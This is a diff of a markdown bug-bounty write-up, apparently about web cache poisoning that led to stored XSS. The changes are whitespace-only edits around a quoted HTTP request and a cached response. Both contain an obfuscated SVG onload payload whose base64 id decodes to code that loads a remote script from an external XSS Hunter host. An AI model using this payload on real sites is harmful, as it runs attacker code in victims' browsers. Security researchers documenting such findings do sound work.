@@ -238,16 +238,20 @@ That was easy. Although the response doesn't have any headers that suggest a cac
 
 - **stored XSS reported by bxmbn**
 
-  ```
+```
   GET /xxxx/xxxx/xxx HTTP/2
 Host: Redacted
 Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
 ...
 ```
 
+
+
+
 Response:
 
 ```
+
 HTTP/2 200 Ok...
 Content-Type: text/html; charset=utf-8
 X-Cache: HIT
@@ -255,6 +259,7 @@ X-Cache: HIT
 <svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>...
 
 ```
+
 
 woke up with 35 Notifications from XSSHunter the next day, and to my surprise, 4 of them were fired on a different subdomain.
 
